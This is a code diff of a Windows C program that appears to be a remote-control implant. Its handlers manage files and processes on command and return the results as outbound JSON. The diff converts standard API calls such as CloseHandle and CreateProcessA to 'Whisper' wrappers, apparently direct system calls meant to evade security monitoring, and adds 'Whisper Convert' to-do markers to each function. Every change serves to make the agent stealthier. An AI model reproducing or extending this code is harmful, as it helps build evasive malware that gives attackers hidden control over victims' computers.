@@ -560,6 +560,7 @@ void pwd(OutboundJsonDataStruct* response_struct) {
 // ============
 // File OPs
 // ============
+// [ ] Whisper Convert
 void write_file(OutboundJsonDataStruct* response_struct, char* args) {
     char* context = NULL;
     char* path = strtok_s(args, " ", &context);
@@ -590,9 +591,9 @@ void write_file(OutboundJsonDataStruct* response_struct, char* args) {
         set_response_data(response_struct, error_message);
     }
 
-    CloseHandle(hFile);
+    WhisperCloseHandle(hFile);
 }
-
+// [ ] Whisper Convert
 void read_file(OutboundJsonDataStruct* response_struct, char* args) {
     char* context = NULL;
     char* path = strtok_s(args, " ", &context);
@@ -618,14 +619,14 @@ void read_file(OutboundJsonDataStruct* response_struct, char* args) {
         char error_message[256];
         FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message);
-        CloseHandle(hFile);
+        WhisperCloseHandle(hFile);
         return;
     }
 
     char* contents = (char*)malloc(fileSize + 1);
     if (!contents) {
         set_response_data(response_struct, "Memory allocation failed");
-        CloseHandle(hFile);
+        WhisperCloseHandle(hFile);
         return;
     }
 
@@ -641,9 +642,9 @@ void read_file(OutboundJsonDataStruct* response_struct, char* args) {
     }
 
     free(contents);
-    CloseHandle(hFile);
+    WhisperCloseHandle(hFile);
 }
-
+// [ ] Whisper Convert
 void delete_file(OutboundJsonDataStruct* response_struct, char* args) {
     char* context = NULL;
     char* path = strtok_s(args, " ", &context);
@@ -662,7 +663,7 @@ void delete_file(OutboundJsonDataStruct* response_struct, char* args) {
         set_response_data(response_struct, error_message);
     }
 }
-
+// [ ] Whisper Convert
 void append_file(OutboundJsonDataStruct* response_struct, char* args) {
     char* context = NULL;
     char* path = strtok_s(args, " ", &context);
@@ -695,9 +696,9 @@ void append_file(OutboundJsonDataStruct* response_struct, char* args) {
         set_response_data(response_struct, error_message);
     }
 
-    CloseHandle(hFile);
+    WhisperCloseHandle(hFile);
 }
-
+// [ ] Whisper Convert
 void rename_file(OutboundJsonDataStruct* response_struct, char* args) {
     char* context = NULL;
     char* old_path = strtok_s(args, " ", &context);
@@ -717,7 +718,7 @@ void rename_file(OutboundJsonDataStruct* response_struct, char* args) {
         set_response_data(response_struct, error_message);
     }
 }
-
+// [ ] Whisper Convert
 void copy_file(OutboundJsonDataStruct* response_struct, char* args) {
     char* context = NULL;
     char* src = strtok_s(args, " ", &context);
@@ -737,7 +738,7 @@ void copy_file(OutboundJsonDataStruct* response_struct, char* args) {
         set_response_data(response_struct, error_message);
     }
 }
-
+// [ ] Whisper Convert
 void ls(OutboundJsonDataStruct* response_struct, char* args) {
     char* context = NULL;
     char* path = strtok_s(args, " ", &context);
@@ -788,11 +789,11 @@ void ls(OutboundJsonDataStruct* response_struct, char* args) {
     }
 }
 
-/*
-Process Ops
+// ============
+// Process Ops
+// ============
 
-*/
-
+// [ ] Whisper Convert
 void start_process(OutboundJsonDataStruct* response_struct, char* args) {
     char* context = NULL;
     char* command = strtok_s(args, " ", &context);
@@ -809,14 +810,14 @@ void start_process(OutboundJsonDataStruct* response_struct, char* args) {
     si.cb = sizeof(si);
     ZeroMemory(&pi, sizeof(pi));
 
-    if (CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+    if (WhisperCreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
         DEBUG_LOG("Process started successfully. PID: %lu\n", pi.dwProcessId);
         char message[256];
         snprintf(message, sizeof(message), "Process started successfully. PID: %lu", pi.dwProcessId);
         set_response_data(response_struct, message);
 
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+        WhisperCloseHandle(pi.hProcess);
+        WhisperCloseHandle(pi.hThread);
     } else {
         DWORD error = GetLastError();
         char error_message[256];
@@ -825,6 +826,7 @@ void start_process(OutboundJsonDataStruct* response_struct, char* args) {
     }
 }
 
+// [ ] Whisper Convert
 void kill_process(OutboundJsonDataStruct* response_struct, char* args) {
     char* context = NULL;
     char* pid_str = strtok_s(args, " ", &context);
@@ -854,9 +856,10 @@ void kill_process(OutboundJsonDataStruct* response_struct, char* args) {
         set_response_data(response_struct, error_message);
     }
 
-    CloseHandle(hProcess);
+    WhisperCloseHandle(hProcess);
 }
 
+// [ ] Whisper Convert
 void suspend_process(OutboundJsonDataStruct* response_struct, char* args) {
     char* context = NULL;
     char* pid_str = strtok_s(args, " ", &context);
@@ -886,9 +889,10 @@ void suspend_process(OutboundJsonDataStruct* response_struct, char* args) {
         set_response_data(response_struct, error_message);
     }
 
-    CloseHandle(hProcess);
+    WhisperCloseHandle(hProcess);
 }
 
+// [ ] Whisper Convert
 void resume_process(OutboundJsonDataStruct* response_struct, char* args) {
     char* context = NULL;
     char* pid_str = strtok_s(args, " ", &context);
@@ -918,9 +922,10 @@ void resume_process(OutboundJsonDataStruct* response_struct, char* args) {
         set_response_data(response_struct, error_message);
     }
 
-    CloseHandle(hProcess);
+    WhisperCloseHandle(hProcess);
 }
 
+// [ ] Whisper Convert
 void list_processes(OutboundJsonDataStruct* response_struct) {
     HANDLE hProcessSnapshot = INVALID_HANDLE_VALUE;
     PROCESSENTRY32 pe32;
@@ -946,7 +951,7 @@ void list_processes(OutboundJsonDataStruct* response_struct) {
         } while (Process32Next(hProcessSnapshot, &pe32));
     }
 
-    CloseHandle(hProcessSnapshot);
+    WhisperCloseHandle(hProcessSnapshot);
 
     if (strlen(processList) == 0) {
         set_response_data(response_struct, "No processes found.");
